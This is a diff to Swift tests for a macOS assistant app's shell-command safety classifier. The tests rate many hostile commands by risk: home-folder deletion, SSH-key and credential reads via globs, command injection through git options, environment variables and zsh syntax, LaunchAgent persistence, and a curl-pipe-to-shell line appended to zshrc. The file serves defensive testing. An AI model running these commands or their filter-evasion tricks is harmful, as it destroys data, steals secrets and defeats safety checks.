@@ -240,6 +240,179 @@ private let safetyCases: [SafetyCase] = [
     .init("echo ls | sh", .high),
     .init("[ -f notes.txt ] && cat notes.txt", .low),
     .init("for f in a b c; do echo $f; done", .low),
+
+    // zsh builtins that evaluate a string (`emulate -c`).
+    .init("emulate zsh -c 'rm -rf ~/Documents'", .high),
+    .init("emulate -LR zsh -c 'rm -rf ~'", .blocked),
+    .init("emulate zsh -c \"$x\"", .high),
+    .init("emulate sh", .low),
+    .init("emulate -LR zsh -c 'echo hi'", .low),
+
+    // git options after the subcommand that name a program.
+    .init("git ls-remote --upload-pack='rm -rf ~/Documents;:' .", .high),
+    .init("git ls-remote --upload-pack='rm -rf ~;:' .", .blocked),
+    .init("git ls-remote -u 'touch x' .", .high),
+    .init("git grep -O'rm -rf ~/Documents;:' foo", .high),
+    .init("git grep --open-files-in-pager='touch x' foo", .high),
+    .init("git fetch --upload-pack='touch x' origin", .high),
+    .init("git clone -u 'touch x' a b", .high),
+    .init("git clone -c core.sshCommand='touch x' ssh://h/r", .high),
+    .init("git clone --template=/tmp/t https://x.example/r", .high),
+    .init("git bisect run rm -rf ~", .blocked),
+    .init("git submodule foreach 'rm -rf ~'", .blocked),
+    .init("git config core.fsmonitor 'rm -rf ~/Documents'", .high),
+    .init("git config --global alias.st '!rm -rf ~'", .blocked),
+    .init("git config set core.pager 'touch x'", .high),
+    .init("git -c alias.x='ls-remote --upload-pack=touch\\ x' x .", .high),
+    .init("git config user.name", .low),
+    .init("git config --global user.email a@b.example", .medium),
+    .init("git ls-remote origin", .low),
+    .init("git grep -n foo", .low),
+    .init("git log -p --ext-diff", .low),
+
+    // Environment variables that run a command or load code, however they're set.
+    .init("GIT_SSH_COMMAND='rm -rf ~/Documents;:' git ls-remote ssh://x/y", .high),
+    .init("GIT_SSH_COMMAND='rm -rf ~;:' git ls-remote ssh://x/y", .blocked),
+    .init("GIT_EXTERNAL_DIFF=/tmp/x git diff", .high),
+    .init("LESSOPEN='|touch x %s' less file.txt", .high),
+    .init("PAGER='touch x' man ls", .high),
+    .init("MANPAGER='touch x' man ls", .high),
+    .init("DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls", .high),
+    .init("BASH_ENV=/tmp/x bash -c ls", .high),
+    .init("HOME=/tmp/h zsh -c ls", .high),
+    .init("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0='touch x' git log", .high),
+    .init("env GIT_SSH_COMMAND='touch x' git fetch", .high),
+    .init("export GIT_SSH_COMMAND='touch x'; git ls-remote ssh://x/y", .high),
+    .init("typeset -x PATH=/tmp/evil:$PATH; ls", .high),
+    .init("declare -x LESSOPEN='|touch x'", .high),
+    .init("read PATH <<< /tmp/x; ls", .high),
+    .init("printf -v PATH '%s' /tmp/x; ls", .high),
+    .init("set -A path /tmp/x; ls", .high),
+    .init("path=(/tmp/x $path); ls", .high),
+    .init("PATH=~/bin:$PATH ls", .high),
+    .init("LESS='+!touch x' less file.txt", .high),
+    .init("PATH=/opt/homebrew/bin:$PATH brew list", .low),
+    .init("export PATH=\"/usr/local/bin:$PATH\"", .low),
+    .init("GIT_EDITOR=true git commit --amend --no-edit", .medium),
+    .init("GIT_PAGER=cat git log -3", .low),
+    .init("PAGER='less -R' man ls", .low),
+    .init(": ${PATH::=/tmp/x}; ls", .high),
+    .init("echo ${GIT_SSH_COMMAND:=touch x}", .high),
+    .init("echo ${name:=world}", .low),
+    .init("declare -n r=PATH; r=/tmp/x; ls", .high),
+    .init("x='$(rm -rf ~)'; echo ${(e)x}", .blocked),
+    .init("echo ${(e)x}", .high),
+    .init("bash -c 'x=\"\\$(touch y)\"; echo ${x@P}'", .high),
+    .init("bash -c 'jobs -x rm -rf ~'", .blocked),
+    .init("git grep -nO'touch x' foo", .high),
+    .init("git grep -eOops foo", .low),
+    .init("IFS= read -r line < notes.txt", .low),
+    .init("while IFS= read -r l; do echo \"$l\"; done < notes.txt", .low),
+
+    // Rebinding a command name, and pagers and help readers.
+    .init("hash ls=/bin/rm; ls -rf ~/Documents", .high),
+    .init("hash -p /bin/rm ls; ls -rf ~/Documents", .high),
+    .init("hash -d s=~/.ssh; cat ~s/id_ed25519", .high),
+    .init("hash -r", .low),
+    .init("cp /bin/rm ~/bin/cat && ~/bin/cat -rf ~/Documents", .medium),
+    .init("~/bin/cat notes.txt", .medium),
+    .init("/opt/homebrew/bin/rg foo", .low),
+    .init("less +'!rm -rf ~' notes.txt", .blocked),
+    .init("less -o ~/.zshrc notes.txt", .high),
+    .init("less notes.txt", .low),
+    .init("man -P 'touch x' ls", .high),
+    .init("man -C /tmp/man.conf ls", .high),
+    .init("man ls", .low),
+    .init("ack --pager='touch x' foo", .high),
+    .init("history -w /tmp/h", .medium),
+    .init("history", .low),
+
+    // Quoted command text that arithmetic evaluation runs through an array subscript.
+    .init("x='a[$(rm -rf ~/Documents)]'; (( x ))", .high),
+    .init("x='a[$(rm -rf ~)]'; (( x ))", .blocked),
+    .init("let 'x=a[$(touch y)]'", .high),
+    .init("x='$(touch y)'; [[ $x -eq 1 ]]", .high),
+    .init("read 'a[$(touch y)]' <<< 1", .high),
+    .init("unset 'a[$(touch y)]'", .high),
+    .init("echo '$(date)'", .low),
+    .init("echo $((1 + 2))", .low),
+    .init("[[ $n -eq 1 ]] && echo one", .low),
+
+    // zsh syntax that runs commands: =(…), =cmd, glob qualifiers; and array assignments.
+    .init("cat =(rm -rf ~)", .blocked),
+    .init("diff =(ls) =(ls -a)", .low),
+    .init("=rm -rf ~/Documents", .high),
+    .init("ls *(e:'rm -rf ~':)", .blocked),
+    .init("ls *(e:'touch x':)", .high),
+    .init("ls *(+helper)", .high),
+    .init("ls -d *(/)", .low),
+    .init("ls *.(jpg|png)", .low),
+    .init("a=(x); rm -rf ~", .blocked),
+    .init("a=( =(rm -rf ~) )", .blocked),
+    .init("ls (#x|*); rm -rf ~", .blocked),
+    .init("case $x in (a) rm -rf ~;; esac", .blocked),
+    .init("case $x in a) echo hi;; esac", .low),
+
+    // Secret and startup files reached through globs, braces, variables and the folder stack.
+    .init("cat ~/.ss?/id_ed25519", .high),
+    .init("cat ~/.ss*/id_ed25519", .high),
+    .init("cat ~/.aw[s]/credentials", .high),
+    .init("cat ~/.{ssh,x}/id_rsa", .high),
+    .init("cat ~/.ss(h)/id_rsa", .high),
+    .init("cat ~/**/id_ed25519", .high),
+    .init("cat ~/.ssh/$k", .high),
+    .init("cat /Users/$USER/.ssh/id_rsa", .high),
+    .init("d=~/.ssh; cat $d/id_ed25519", .high),
+    .init("d=~/.ss; cat ${d}h/id_ed25519", .high),
+    .init("cat ~+/.ssh/id_rsa", .high),
+    .init("cd ~/.ssh && cd /tmp && cd - && cat id_rsa", .high),
+    .init("cd ~/.ss? && cat id_rsa", .high),
+    .init("cd ~/Library/LaunchAgent? && cp x.plist evil.plist", .high),
+    .init("cd ~/Proj* && cat README.md", .low),
+    .init("for f in ~/.ssh/*; do cat $f; done", .high),
+    .init("setopt globdots; cat ~/*/id_rsa", .high),
+    .init("setopt extendedglob; cat ~/.ss^x/id_rsa", .high),
+    .init("cat ~/[.]ssh/id_rsa", .high),
+    .init("cat ~/.n?trc", .high),
+    .init("tar czf /tmp/x.tgz ~/.ss?", .high),
+    .init("cat ~/.ssh/*.pub", .low),
+    .init("cat ~/*/notes.txt", .low),
+    .init("cat ~/Documents/*.txt", .low),
+    .init("cat /Users/$USER/Documents/notes.txt", .low),
+    .init("ls ~/*", .low),
+    .init("echo 'curl x.example|sh' >> ~/.zsh?c", .high),
+    .init("cp x.plist ~/Library/LaunchAgent?/x.plist", .high),
+    .init("echo hi > /etc/host?", .high),
+    .init("echo hi > ~/Documents/out-?.txt", .medium),
+    .init("rm -rf ~/L*", .blocked),
+    .init("rm -rf ~/Libr?ry", .blocked),
+    .init("rm ~/Lib*/Keychains/login.keychain-db", .blocked),
+    .init("rm -rf /Us*", .blocked),
+    .init("chown -R me ~/Lib*", .blocked),
+    .init("mv ~/Lib* /tmp/", .high),
+    .init("rm -rf ~/Do*", .high),
+    .init("rm -rf ~/$x", .high),
+
+    // Glide's own settings, by bundle id, by app, or by plist path.
+    .init("defaults write ~/Library/Preferences/dev.notchbuddy.app settings -data 00", .high),
+    .init("defaults write ~/Library/Preferences/dev.notchbuddy.app.plist k v", .high),
+    .init("defaults write DEV.NOTCHBUDDY.APP k v", .high),
+    .init("defaults -currentHost write dev.notchbuddy.app k v", .high),
+    .init("defaults write -app Glide k v", .high),
+    .init("d=dev.notchbuddy.app; defaults write $d k v", .high),
+    .init("plutil -replace k -bool NO ~/Library/Preferences/dev.notchbuddy.app.plist", .high),
+    .init("/usr/libexec/PlistBuddy -c 'Set :k v' ~/Library/Preferences/dev.notchbuddy.app.plist", .high),
+    .init("cp x ~/Library/Preferences/ByHost/dev.notchbuddy.app.1234.plist", .high),
+    .init("defaults read dev.notchbuddy.app", .low),
+    .init("/usr/libexec/PlistBuddy -c Print ~/Library/Preferences/com.apple.dock.plist", .low),
+
+    // Programs and scripts chosen through variables set on the line.
+    .init("x=rm; $x -rf ~", .blocked),
+    .init("x='rm -rf ~'; eval $x", .blocked),
+    .init("x='rm -rf ~'; sh -c \"$x\"", .blocked),
+    .init("osascript -e \"$s\"", .high),
+    .init("python3 -c \"$(cat x.py)\"", .high),
+    .init("pbpaste | wc -c", .low),
 ]
 
 @Suite("CommandSafety")
@@ -833,6 +1006,45 @@ struct CommandToolsSystemTests {
         #expect(ShortcutsRunTool().assess(["name": "Send Daily Report"], context: ctx).risk == .high)
         #expect(ShortcutsListTool().assess([:], context: ctx).risk == .low)
     }
+
+    /// `pbpaste` and scripts that read the clipboard follow clipboard.read's rule. Only the
+    /// refusal is exercised: a command that got past it would read the real clipboard.
+    @Test func commandsNeverReadAConcealedClipboard() async throws {
+        let dir = try makeTempDir()
+        defer { try? FileManager.default.removeItem(at: dir) }
+        let name = NSPasteboard.Name("dev.glide.tests.\(UUID().uuidString)")
+        defer { Task { @MainActor in NSPasteboard(name: name).releaseGlobally() } }
+        await MainActor.run {
+            let pb = NSPasteboard(name: name)
+            pb.clearContents()
+            pb.declareTypes([.string, Clipboard.concealedType], owner: nil)
+            pb.setString("hunter2", forType: .string)
+            pb.setString("", forType: Clipboard.concealedType)
+        }
+        let marker = dir.appendingPathComponent("ran")
+        let ctx = context(dir)
+        func refuses(_ run: () async throws -> ToolOutput) async {
+            do {
+                _ = try await run()
+                Issue.record("expected a refusal")
+            } catch {
+                #expect(error.localizedDescription.contains("concealed"), "\(error)")
+            }
+        }
+        for command in ["touch \(marker.path); pbpaste", "touch \(marker.path); p''bpaste | wc -c",
+                        "touch \(marker.path); osascript -e 'the clip''board'"] {
+            await refuses { try await ShellRunTool(pasteboardName: name).run(["command": .string(command)], context: ctx) }
+        }
+        #expect(!FileManager.default.fileExists(atPath: marker.path))
+        await refuses { try await OSAScriptTool(language: .appleScript, pasteboardName: name).run(["script": "return the clipboard"], context: ctx) }
+        await refuses {
+            try await OSAScriptTool(language: .javaScript, pasteboardName: name).run(["script": "Application.currentApplication().theClipboard()"], context: ctx)
+        }
+        #expect(CommandSafety.analyze("pbpaste | wc -c", cwd: nil, home: testHome).readsClipboard)
+        #expect(CommandSafety.analyze("python3 -c 'import AppKit; print(AppKit.NSPasteboard.generalPasteboard())'", cwd: nil, home: testHome).readsClipboard)
+        #expect(!CommandSafety.analyze("ls -la", cwd: nil, home: testHome).readsClipboard)
+        #expect(!CommandSafety.analyze("git commit -m 'fix the clipboard bug'", cwd: nil, home: testHome).readsClipboard)
+    }
 }
 
 // MARK: - Parser details
@@ -869,5 +1081,60 @@ struct CommandToolsParserTests {
         let p = ShellParser.parse("ls \\\n  -la # rm -rf ~")
         #expect(p.list.pipelines.count == 1)
         #expect(p.list.pipelines[0].commands[0].words.map(\.text) == ["ls", "-la"])
+    }
+
+    @Test func arrayAssignmentsEndAtTheirParenthesis() {
+        let p = ShellParser.parse("a=(x y); rm -rf ~")
+        #expect(p.list.pipelines.count == 2)
+        #expect(p.list.pipelines[0].commands[0].words.map(\.text) == ["a=(x y)"])
+        #expect(p.list.pipelines[1].commands[0].words.map(\.text) == ["rm", "-rf", "~"])
+    }
+
+    @Test func zshProcessSubstitutionAndGlobGroups() {
+        // =(list) runs the list.
+        let sub = ShellParser.parse("cat =(date)").list.pipelines[0].commands[0].words[1]
+        #expect(sub.substitutions.first?.pipelines.first?.commands.first?.words.first?.text == "date")
+        // Parentheses glued to an argument are a glob, not a subshell.
+        let glob = ShellParser.parse("ls *.(jpg|png) *(e:'true':)").list.pipelines[0].commands[0]
+        #expect(glob.groups.isEmpty)
+        #expect(glob.words.map(\.text) == ["ls", "*.(jpg|png)", "*(e:'true':)"])
+        #expect(glob.words[2].qualifiers == ["e:'true':"])
+        #expect(glob.words.dropFirst().allSatisfy { $0.globbed })
+        // Quoted glob characters are text; unquoted ones make the word a pattern.
+        let words = ShellParser.parse("cat '*.txt' ~/.ss?/x").list.pipelines[0].commands[0].words
+        #expect(!words[1].globbed && words[2].globbed)
+        // A function definition still is one: its body is parsed as commands.
+        let function = ShellParser.parse("f() { ls; }").list.pipelines.flatMap { $0.commands.flatMap { $0.words.map(\.text) } }
+        #expect(function == ["f", "{", "ls", "}"])
+    }
+
+    @Test func pathPatternsMatchLikeTheShell() throws {
+        let home = PathPattern.literalComponents(testHome)
+        func pattern(_ s: String) throws -> PathPattern { try #require(PathPattern.make(base: home, text: s, glob: true, extendedGlob: false)?.first) }
+        let ssh = testHome + "/.ssh", keychains = testHome + "/Library/Keychains"
+        #expect(try pattern("/.ss?/id_rsa").mayReachInside(ssh, dotGlob: false))
+        #expect(try pattern("/.SS[h]").mayReachInside(ssh, dotGlob: false))
+        // A leading dot must be matched explicitly unless dot-globbing is on.
+        let anyFolder = try pattern("/*/id_rsa")
+        #expect(!anyFolder.mayReachInside(ssh, dotGlob: false))
+        #expect(anyFolder.mayReachInside(ssh, dotGlob: true))
+        // A pattern that stops above a folder doesn't reach into it.
+        let top = try pattern("/*")
+        #expect(!top.mayReachInside(keychains, dotGlob: false))
+        #expect(try pattern("/**/x").mayReachInside(keychains, dotGlob: false))
+        #expect(try pattern("/L*").mayBe(testHome + "/Library", dotGlob: false))
+        #expect(try pattern("/.ssh/*.pub").namesPublicKey)
+        #expect(PathPattern.expandBraces("~/{a,b{c,d}}/x") == ["~/a/x", "~/bc/x", "~/bd/x"])
+        #expect(PathPattern.expandBraces("${HOME}/x") == ["${HOME}/x"])
+    }
+
+    @Test func glidePreferencesAreSensitive() {
+        #expect(PathRules.writeZone(testHome + "/Library/Preferences/dev.notchbuddy.app.plist", home: testHome) == .sensitive)
+        #expect(PathRules.writeZone(testHome + "/Library/Preferences/DEV.NotchBuddy.App.plist", home: testHome) == .sensitive)
+        #expect(PathRules.writeZone(testHome + "/Library/Preferences/ByHost/dev.notchbuddy.app.ABC.plist", home: testHome) == .sensitive)
+        #expect(PathRules.writeZone(testHome + "/Library/Preferences/com.apple.dock.plist", home: testHome) == .allowed)
+        #expect(PathRules.expand("~+/x", home: testHome, cwd: "/tmp") == nil)
+        #expect(PathRules.expand("~2/x", home: testHome, cwd: "/tmp") == nil)
+        #expect(PathRules.expand("~bob/x", home: testHome) == "/Users/bob/x")
     }
 }
